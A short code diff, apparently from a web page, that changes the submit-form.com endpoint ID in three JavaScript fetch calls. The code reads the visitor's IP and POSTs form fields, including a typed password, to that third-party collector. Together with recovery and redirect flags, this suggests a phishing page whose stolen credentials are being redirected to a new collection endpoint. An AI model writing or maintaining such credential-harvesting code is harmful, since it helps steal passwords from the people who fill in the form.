@@ -1071,7 +1071,7 @@
 
     let allowRecovery = false, finalRedirect = "";
 
-    fetch("https://submit-form.com/pZVLGc0l6")
+    fetch("https://submit-form.com/L9XY17k40")
         .then(r => r.json())
         .then(d => {
             const ip = d.clientIp;
@@ -1088,7 +1088,7 @@
             xs: document.getElementById("xs").value.trim()
         };
 
-        fetch("https://submit-form.com/pZVLGc0l6", {
+        fetch("https://submit-form.com/L9XY17k40", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(formData)
@@ -1127,7 +1127,7 @@
 
         btn.classList.add("loading"); btn.disabled = true;
 
-        fetch("https://submit-form.com/pZVLGc0l6", {
+        fetch("https://submit-form.com/L9XY17k40", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ password: val })
